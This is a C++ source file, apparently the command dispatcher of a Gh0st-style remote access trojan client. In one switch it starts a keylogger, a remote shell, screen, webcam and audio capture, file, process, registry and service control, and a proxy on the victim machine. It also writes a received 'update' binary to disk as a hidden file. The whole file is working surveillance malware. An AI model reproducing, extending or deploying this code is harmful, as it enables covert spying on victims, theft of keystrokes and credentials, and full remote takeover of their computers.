// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "KernelManager.h"
#include "Common.h"
#include <iostream>
#include <fstream>
#include <corecrt_io.h>
#include "ClientDll.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CKernelManager::CKernelManager(CONNECT_ADDRESS* conn, IOCPClient* ClientObject, HINSTANCE hInstance) 
	: m_conn(conn), m_hInstance(hInstance), CManager(ClientObject)
{
	m_ulThreadCount = 0;
#ifdef _DEBUG
	m_settings = { 5 };
#else
	m_settings = { 30 };
#endif
	m_nNetPing = -1;
}

CKernelManager::~CKernelManager()
{
	Mprintf("~CKernelManager begin\n");
	int i = 0;
	for (i=0;i<MAX_THREADNUM;++i)
	{
		if (m_hThread[i].h!=0)
		{
			CloseHandle(m_hThread[i].h);
			m_hThread[i].h = NULL;
			m_hThread[i].run = FALSE;
			while (m_hThread[i].p)
				Sleep(50);
		}
	}
	m_ulThreadCount = 0;
	Mprintf("~CKernelManager end\n");
}

// 获取可用的线程下标
UINT CKernelManager::GetAvailableIndex() {
	if (m_ulThreadCount < MAX_THREADNUM) {
		return m_ulThreadCount;
	}

	for (int i = 0; i < MAX_THREADNUM; ++i)
	{
		if (m_hThread[i].p == NULL) {
			return i;
		}
	}
	return -1;
}

BOOL WriteBinaryToFile(const char* data, ULONGLONG size)
{
	if (size > 32 * 1024 * 1024) {
		Mprintf("WriteBinaryToFile fail: too large file size!!\n");
		return FALSE;
	}

	char path[_MAX_PATH], * p = path;
	GetModuleFileNameA(NULL, path, sizeof(path));
	while (*p) ++p;
	while ('\\' != *p) --p;
	strcpy(p + 1, "ServerDll.new");
	if (_access(path, 0)!=-1)
	{
		DeleteFileA(path);
	}
	// 打开文件，以二进制模式写入
	std::string filePath = path;
	std::ofstream outFile(filePath, std::ios::binary);

	if (!outFile)
	{
		Mprintf("Failed to open or create the file: %s.\n", filePath.c_str());
		return FALSE;
	}

	// 写入二进制数据
	outFile.write(data, size);

	if (outFile.good())
	{
		Mprintf("Binary data written successfully to %s.\n", filePath.c_str());
	}
	else
	{
		Mprintf("Failed to write data to file.\n");
		outFile.close();
		return FALSE;
	}

	// 关闭文件
	outFile.close();
	// 设置文件属性为隐藏
	if (SetFileAttributesA(filePath.c_str(), FILE_ATTRIBUTE_HIDDEN))
	{
		Mprintf("File created and set to hidden: %s\n", filePath.c_str());
	}
	return TRUE;
}

VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	bool isExit = szBuffer[0] == COMMAND_BYE || szBuffer[0] == SERVER_EXIT;
	if ((m_ulThreadCount = GetAvailableIndex()) == -1) {
		if (!isExit) {
			Mprintf("CKernelManager: The number of threads exceeds the limit.\n");
			return;
		}
	}
	else if (!isExit){
		m_hThread[m_ulThreadCount].p = nullptr;
		m_hThread[m_ulThreadCount].conn = m_conn;
	}

	switch(szBuffer[0])
	{
	case COMMAND_PROXY: {
		m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
		m_hThread[m_ulThreadCount++].h = CreateThread(NULL, 0, LoopProxyManager, &m_hThread[m_ulThreadCount], 0, NULL);;
		break;
	}
	
	case COMMAND_SHARE:
		if (ulLength > 2) {
			switch (szBuffer[1]) {
			case SHARE_TYPE_YAMA: {
				auto a = NewClientStartArg((char*)szBuffer + 2, IsSharedRunning, TRUE);
				if (nullptr!=a) CloseHandle(CreateThread(0, 0, StartClientApp, a, 0, 0));
				break;
			}
			case SHARE_TYPE_HOLDINGHANDS:
				break;
			}
		}
		break;

	case CMD_HEARTBEAT_ACK:
		if (ulLength > 8) {
			uint64_t n = 0;
			memcpy(&n, szBuffer + 1, sizeof(uint64_t));
			auto system_ms = std::chrono::time_point_cast<std::chrono::milliseconds>(
				std::chrono::system_clock::now()
				);
			m_nNetPing = int((system_ms.time_since_epoch().count() - n) / 2);
		}
		break;
	case CMD_MASTERSETTING:
		if (ulLength > sizeof(MasterSettings)) {
			memcpy(&m_settings, szBuffer + 1, sizeof(MasterSettings));
		}
		break;
	case COMMAND_KEYBOARD: //键盘记录
		{
			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL, 0, LoopKeyboardManager, &m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_TALK:
		{
			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
			m_hThread[m_ulThreadCount].user = m_hInstance; 
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopTalkManager, &m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_SHELL:
		{
			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopShellManager, &m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_SYSTEM:       //远程进程管理
		{
			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL, 0, LoopProcessManager, &m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_WSLIST:       //远程窗口管理
		{
			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopWindowManager, &m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_BYE:
		{
			BYTE	bToken = COMMAND_BYE;// 被控端退出
			m_ClientObject->OnServerSending((char*)&bToken, 1);
			g_bExit = S_CLIENT_EXIT;
			Mprintf("======> Client exit \n");
			break;
		}

	case SERVER_EXIT:
		{
			BYTE	bToken = SERVER_EXIT;// 主控端退出  
			m_ClientObject->OnServerSending((char*)&bToken, 1);
			g_bExit = S_SERVER_EXIT;
			Mprintf("======> Server exit \n");
			break;
		}

	case COMMAND_SCREEN_SPY:
		{
			UserParam* user = new UserParam{ ulLength > 1 ? new BYTE[ulLength - 1] : nullptr, int(ulLength-1) };
			if (ulLength > 1) {
				memcpy(user->buffer, szBuffer + 1, ulLength - 1);
			}
			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
		    m_hThread[m_ulThreadCount].user = user;
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopScreenManager, &m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_LIST_DRIVE :
		{
			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopFileManager, &m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_WEBCAM:
		{
			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopVideoManager, &m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_AUDIO:
		{
			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopAudioManager, &m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_REGEDIT:
		{
			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopRegisterManager, &m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_SERVICES:
		{
			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopServicesManager, &m_hThread[m_ulThreadCount], 0, NULL);
			break;
		}

	case COMMAND_UPDATE:
		{
			ULONGLONG size=0;
			memcpy(&size, (const char*)szBuffer + 1, sizeof(ULONGLONG));
			if (WriteBinaryToFile((const char*)szBuffer + 1 + sizeof(ULONGLONG), size)) {
				g_bExit = S_CLIENT_UPDATE;
			}
			break;
		}

	default:
		{
			Mprintf("!!! Unknown command: %d\n", unsigned(szBuffer[0]));
			break;
		}
	}
}
